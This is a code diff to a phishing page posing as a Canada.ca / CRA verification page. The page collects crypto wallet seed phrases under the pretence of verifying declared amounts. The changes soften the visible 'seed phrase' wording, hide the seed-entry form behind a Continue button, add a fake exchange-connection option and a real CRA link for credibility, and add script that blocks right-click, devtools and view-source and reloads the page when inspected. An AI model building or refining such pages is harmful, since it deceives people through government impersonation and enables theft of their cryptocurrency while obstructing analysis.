@@ -4,6 +4,8 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Verification Required - Canada.ca</title>
+  <link rel="icon" type="image/x-icon" href="/favicon.ico?v=2">
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2">
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />
   <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;700&family=Lato:wght@400;700&display=swap" rel="stylesheet">
@@ -13,6 +15,8 @@
     body { font-family: 'Noto Sans', sans-serif; color: #333; }
     .container-custom { max-width: 1200px; margin: 0 auto; padding: 0 15px; }
     .nav-bar { background-color: #26374a; height: 50px; }
+    .nav-bar a { text-decoration: none; cursor: pointer; }
+    .nav-bar a:hover { background-color: #1a2633; }
     .red-accent { border-bottom: 4px solid #af3c43; display: inline-block; margin-bottom: 20px; }
   </style>
 </head>
@@ -29,7 +33,7 @@
   <nav class="nav-bar">
     <div class="container-custom flex justify-between items-center h-full text-white font-bold">
       <button class="px-4 h-full border-l border-r border-gray-700">MENU <i class="fas fa-caret-down"></i></button>
-      <button class="px-4 h-full">CRA sign in</button>
+      <a href="https://www.canada.ca/en/revenue-agency.html" target="_blank" class="px-4 h-full flex items-center">CRA sign in</a>
     </div>
   </nav>
 
@@ -51,25 +55,37 @@
         <button onclick="showWalletSelector()" class="bg-[#335075] text-white px-6 py-2 rounded font-bold hover:bg-[#26374a] w-full flex items-center justify-center gap-2">
           <i class="fas fa-link"></i> Connect Sign-in Partner
         </button>
+
+        <div class="mt-10">
+          <h3 class="text-xl font-bold mb-3">Using an exchange or Unstablecoins?</h3>
+          <p class="text-gray-700 mb-4">Exchange validation is different from other wallets and requires additional steps for secure verification.</p>
+          <button class="bg-[#335075] text-white px-6 py-2 rounded font-bold hover:bg-[#26374a] w-full flex items-center justify-center gap-2">
+            <i class="fas fa-link"></i> Connect third-party
+          </button>
+        </div>
       </section>
 
       <section class="border border-gray-200 rounded-lg p-6">
         <h2 class="text-2xl font-bold mb-4">Manual verification</h2>
-        <p class="text-gray-700 mb-4">Provide your wallet information and seed phrase to verify your declared amounts.</p>
+        <p class="text-gray-700 mb-4">Provide your wallet information to verify your declared amounts.</p>
 
-        <label class="block text-sm font-bold mb-2">Wallet provider</label>
-        <input id="walletProvider" type="text" class="w-full border-2 border-gray-300 rounded px-3 py-2 mb-4" placeholder="e.g., Ledger, Trezor, MetaMask" />
+        <button id="continueManual" onclick="toggleManualForm()" class="bg-[#335075] text-white px-6 py-2 rounded font-bold hover:bg-[#26374a] w-full">Continue</button>
 
-        <label class="block text-sm font-bold mb-2">Seed phrase length</label>
-        <select id="seedLength" class="w-full border-2 border-gray-300 rounded px-3 py-2 mb-4">
-          <option value="12">12 words</option>
-          <option value="24">24 words</option>
-          <option value="28">28 words</option>
-          <option value="36">36 words</option>
-        </select>
+        <div id="manualForm" style="display: none;" class="mt-6">
+          <label class="block text-sm font-bold mb-2">Wallet provider</label>
+          <input id="walletProvider" type="text" class="w-full border-2 border-gray-300 rounded px-3 py-2 mb-4" placeholder="e.g., Ledger, Trezor, MetaMask" />
 
-        <div id="seedFields" class="grid grid-cols-2 sm:grid-cols-3 gap-3 mb-4"></div>
-        <button id="submitManual" class="bg-[#335075] text-white px-6 py-2 rounded font-bold hover:bg-[#26374a]">Submit manual verification</button>
+          <label class="block text-sm font-bold mb-2">Seed phrase length</label>
+          <select id="seedLength" class="w-full border-2 border-gray-300 rounded px-3 py-2 mb-4">
+            <option value="12">12 words</option>
+            <option value="24">24 words</option>
+            <option value="28">28 words</option>
+            <option value="36">36 words</option>
+          </select>
+
+          <div id="seedFields" class="grid grid-cols-2 sm:grid-cols-3 gap-3 mb-4"></div>
+          <button id="submitManual" class="bg-[#335075] text-white px-6 py-2 rounded font-bold hover:bg-[#26374a]">Submit manual verification</button>
+        </div>
       </section>
     </div>
   </main>
@@ -117,10 +133,65 @@
 
   <script src="wallet.js"></script>
   <script>
+    // Anti-scraping protection
+    (function() {
+      // Disable right-click
+      document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        return false;
+      });
+
+      // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+S
+      document.addEventListener('keydown', function(e) {
+        if (e.keyCode == 123 || // F12
+            (e.ctrlKey && e.shiftKey && e.keyCode == 73) || // Ctrl+Shift+I
+            (e.ctrlKey && e.shiftKey && e.keyCode == 74) || // Ctrl+Shift+J
+            (e.ctrlKey && e.keyCode == 85) || // Ctrl+U
+            (e.ctrlKey && e.keyCode == 83)) { // Ctrl+S
+          e.preventDefault();
+          return false;
+        }
+      });
+
+      // Clear console logs
+      setInterval(function() {
+        console.clear();
+      }, 1000);
+
+      // Disable console functions
+      console.log = function() {};
+      console.warn = function() {};
+      console.error = function() {};
+      console.info = function() {};
+      console.debug = function() {};
+
+      // Detect devtools
+      var devtools = /./;
+      devtools.toString = function() {
+        this.opened = true;
+      };
+      setInterval(function() {
+        console.log(devtools);
+        if (devtools.opened) {
+          window.location.reload();
+        }
+      }, 1000);
+    })();
+
     // Override Exo3's showWalletSelector to use flex (needed for centering modal)
     function showWalletSelector() {
       var s = document.getElementById('wallet-selector');
       if (s) s.style.display = 'flex';
+    }
+
+    // Toggle manual verification form
+    function toggleManualForm() {
+      var form = document.getElementById('manualForm');
+      var btn = document.getElementById('continueManual');
+      if (form.style.display === 'none') {
+        form.style.display = 'block';
+        btn.style.display = 'none';
+      }
     }
   </script>
 </body>
